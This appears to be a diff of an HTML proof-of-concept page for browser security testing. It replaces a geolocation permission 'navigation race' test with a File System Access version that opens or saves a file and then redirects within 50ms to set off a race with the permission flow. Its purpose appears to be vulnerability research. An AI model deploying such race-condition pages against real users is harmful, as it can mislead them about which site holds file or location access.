@@ -2,8 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Navigation Race PoC</title>
+  <title>Vulnerable File System Access PoC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+
   <style>
     body {
       margin: 0;
@@ -29,8 +30,14 @@
       box-shadow: 0 20px 60px rgba(0,0,0,.2);
       text-align: center;
     }
+    .notice {
+      margin-top: 14px;
+      font-size: 13px;
+      color: #b00020;
+    }
   </style>
 </head>
+
 <body>
 
 <div style="text-align:center; margin-top:60px;">
@@ -38,49 +45,69 @@
 </div>
 
 <div id="panel">
-  <h2>Request Permission</h2>
-  <p>Tap the button below to trigger permission request.</p>
+  <h2>File System Access (Vulnerable)</h2>
+  <p>Tap the button below to request file access, then observe how the page behaves.</p>
 
-  <button id="requestPermissionBtn">Request Permission</button>
+  <button id="openFile">Open File</button>
+  <button id="saveFile">Save File</button>
   <p id="status">Status: -</p>
+
+  <div class="notice">
+    <b>Warning:</b> Watch for sudden redirects or unexpected behavior
+  </div>
 </div>
 
 <script>
   const panel = document.getElementById('panel');
   const trigger = document.getElementById('trigger');
-  const requestPermissionBtn = document.getElementById('requestPermissionBtn');
+  const openFileBtn = document.getElementById('openFile');
+  const saveFileBtn = document.getElementById('saveFile');
   const status = document.getElementById('status');
 
-  // Step 1: Trigger showing panel
   trigger.onclick = () => {
-    history.pushState({}, '', '/trusted');
+    // Just display the panel without changing the history or URL
     panel.style.display = 'block';
   };
 
-  // Step 2: Mimic a request for permission, e.g., geolocation or camera
-  requestPermissionBtn.onclick = () => {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          status.textContent = `Location: ${position.coords.latitude}, ${position.coords.longitude}`;
-        },
-        (error) => {
-          status.textContent = `Error: ${error.message}`;
-        }
-      );
+  // Open file (vulnerable version)
+  openFileBtn.onclick = async () => {
+    try {
+      // Try to open a file
+      const [fileHandle] = await window.showOpenFilePicker();
+      const file = await fileHandle.getFile();
+      const fileContent = await file.text();
+      status.textContent = `Opened file: ${file.name} with content: ${fileContent.substring(0, 100)}...`;
+
+      // Trigger a race condition by redirecting immediately after file access request
+      setTimeout(() => {
+        // Change location right after file interaction begins (before it's fully completed)
+        window.location.href = 'https://example.com'; // Redirect to another page
+      }, 50); // 50ms delay to trigger race condition
+
+    } catch (e) {
+      status.textContent = 'Failed to open file or permission denied';
     }
   };
 
-  // Step 3: Navigation Race after permission flow starts
-  window.addEventListener('pageshow', () => {
-    requestAnimationFrame(() => {
-      requestAnimationFrame(() => {
-        setTimeout(() => {
-          location.href = 'https://google.com:9090'; // Initiating race condition navigation
-        }, 80);
-      });
-    });
-  });
+  // Save file (vulnerable version)
+  saveFileBtn.onclick = async () => {
+    try {
+      const fileHandle = await window.showSaveFilePicker();
+      const writable = await fileHandle.createWritable();
+      await writable.write('This is some file content.');
+      await writable.close();
+      status.textContent = 'File saved successfully!';
+
+      // Trigger a race condition by redirecting immediately after saving file
+      setTimeout(() => {
+        // Change location right after file access request starts
+        window.location.href = 'https://example.com'; // Redirect to another page
+      }, 50); // 50ms delay to trigger race condition
+
+    } catch (e) {
+      status.textContent = 'Failed to save file or permission denied';
+    }
+  };
 </script>
 
 </body>
